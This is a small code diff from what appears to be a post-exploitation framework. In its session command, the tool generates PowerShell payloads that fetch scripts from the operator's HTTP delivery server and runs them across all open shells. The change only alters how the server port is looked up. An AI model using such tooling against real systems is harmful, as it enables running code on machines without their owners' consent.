@@ -186,7 +186,7 @@ class SessionCommand(AbstractCommand):
             script_route = HttpDeliveringServer.get_route_for_script(script)
             payload.append(self.generator.generate_payload("generate -t powershell",
                 ip=AppConfig.get("default_ip_address"),
-                port=AppConfig.get("port", "HttpServer"),
+                port=HttpServer.get_download_address()[1],
                 route=script_route))
 
         self.command_executor.exec_all_no_result(payload, shell_type=ShellTypes.Powershell)
